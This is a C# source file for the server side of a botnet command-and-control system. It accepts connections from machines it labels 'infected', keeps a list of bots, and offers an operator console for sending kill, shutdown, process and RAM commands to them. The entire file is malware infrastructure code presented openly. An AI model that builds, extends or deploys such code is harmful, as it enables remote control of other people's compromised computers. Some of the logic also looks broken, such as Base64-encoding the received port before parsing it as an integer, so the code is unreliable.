using System;
using System.Linq;
using System.Collections.Generic;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using CnC_Server;
using CnC_Server.Analyzes;
using CnC_Server.Analyzes.Processes_Analyzes;
using CnC_Server.Analyzes.Ram_Analyzes;
using CnC_Server.Options;
using Common.Attributes;
using Common.Commands;
using Common.Commands.Collector_Commands;
using Common.Commands.Executer_Commands;

namespace Server.CnC_Server
{
    public class Server
    {
        private readonly int ServerPort;
        private TcpListener ServerListener;

        private static List<Infected_Machine> Bots = new List<Infected_Machine>();

        private static Dictionary<string, Analysis> Analyzes = new Dictionary<string, Analysis>
        {
            { ReflectionExtensions.GetAttribute<AnalysisNameAttribute>(typeof(NumberOfProcessesLowerThen_Analysis)).AnalysisName, new NumberOfProcessesLowerThen_Analysis() },
            { ReflectionExtensions.GetAttribute<AnalysisNameAttribute>(typeof(RamConsumptionLowerThen_Analysis)).AnalysisName, new RamConsumptionLowerThen_Analysis() }
        };

        private static Dictionary<string, Command> Commands = new Dictionary<string, Command>
        {
            { ReflectionExtensions.GetAttribute<CommandNameAttribute>(typeof(Kill_Command)).CommandName, new Kill_Command() },
            { ReflectionExtensions.GetAttribute<CommandNameAttribute>(typeof(ShutDown_Command)).CommandName, new ShutDown_Command() },
            { ReflectionExtensions.GetAttribute<CommandNameAttribute>(typeof(Processes_Command)).CommandName, new Processes_Command() },
            { ReflectionExtensions.GetAttribute<CommandNameAttribute>(typeof(Ram_Command)).CommandName, new Ram_Command() }
        };

        private static Dictionary<string, Option> Options = new Dictionary<string, Option>
        {
            { ReflectionExtensions.GetAttribute<OptionNameAttribute>(typeof(PrintBots_Option)).OptionName, new PrintBots_Option(Bots) },
            { ReflectionExtensions.GetAttribute<OptionNameAttribute>(typeof(PrintCommands_Option)).OptionName, new PrintCommands_Option(Commands) },
            { ReflectionExtensions.GetAttribute<OptionNameAttribute>(typeof(PrintAnalyzes_Option)).OptionName, new PrintAnalyzes_Option(Analyzes) },
            { ReflectionExtensions.GetAttribute<OptionNameAttribute>(typeof(PrintBotAnalysis_Option)).OptionName, new PrintBotAnalysis_Option(Bots, Analyzes) },
            { ReflectionExtensions.GetAttribute<OptionNameAttribute>(typeof(PrintBotStatus_Option)).OptionName, new PrintBotStatus_Option(Bots) },
            { ReflectionExtensions.GetAttribute<OptionNameAttribute>(typeof(Execute_Option)).OptionName, new Execute_Option(Commands, Bots) }
        };

        public Server(int serverPort)
        {
            this.ServerPort = serverPort;
            this.ServerListener = null;
            Options.Add(ReflectionExtensions.GetAttribute<OptionNameAttribute>(typeof(Help_Option)).OptionName, new Help_Option(Options));
        }

        public void Start()
        {
            try
            {
                Task task = Task.Factory.StartNew(() =>
                {
                    Listen();
                    while (true)
                    {
                        AcceptBot();
                    }
                });

                string CurrentOption = string.Empty;
                Options[ReflectionExtensions.GetAttribute<OptionNameAttribute>(typeof(Help_Option)).OptionName].Run();
                Console.Write("\n>>> ");
                CurrentOption = Console.ReadLine();

                while (!CurrentOption.Equals("exit", StringComparison.CurrentCultureIgnoreCase))
                {
                    Console.Write("\n>>> ");
                    CurrentOption = Console.ReadLine();
                    parseOption(CurrentOption);
                }
            }
            catch(Exception)
            {
                throw;
            }
        }

        private void Listen()
        {
            try
            {
                this.ServerListener = new TcpListener(IPAddress.Any, ServerPort);

                this.ServerListener.Start();
            }
            catch(Exception)
            {
                throw;
            }
        }

        private void AcceptBot()
        {
            try
            {
                Socket clientSocket = this.ServerListener.AcceptSocket();
                
                // Data buffer 
                byte[] bytes = new byte[1024];

                // Receive client port
                int numByte = clientSocket.Receive(bytes);
                string clientPort = Convert.ToBase64String(bytes, 0, numByte);

                // Create new infected machine object with the bot ip and port
                Infected_Machine newBot = new Infected_Machine((clientSocket.RemoteEndPoint as IPEndPoint).Address.ToString(), int.Parse(clientPort));
                
                // Add the new bot to the list of bots
                Bots.Add(newBot);

                clientSocket.Close();
            }
            catch(Exception)
            {
                throw;
            }
        }

        private void parseOption(string option)
        {
            string[] splitedOption = option.Split(' ');
            
            if(splitedOption.Length > 0 && splitedOption.Length < 4
                && Options.ContainsKey(splitedOption[0]))
            {
                runOption(splitedOption[0], splitedOption.Skip(1).ToArray());
                return;
            }

            Console.WriteLine("No matched option was found!");
        }

        private void runOption(string optionName, string[] arguments)
        {
            try
            {
                if (Options[optionName].ParseArguments(arguments))
                {
                    Options[optionName].Run();
                }
                else
                {
                    Console.WriteLine("Invalid use of the selected option!");
                }
            }
            catch(Exception ex)
            {
                Console.WriteLine("Error while executing selected option.\n{0}", ex.ToString());
            }
        }
    }
}
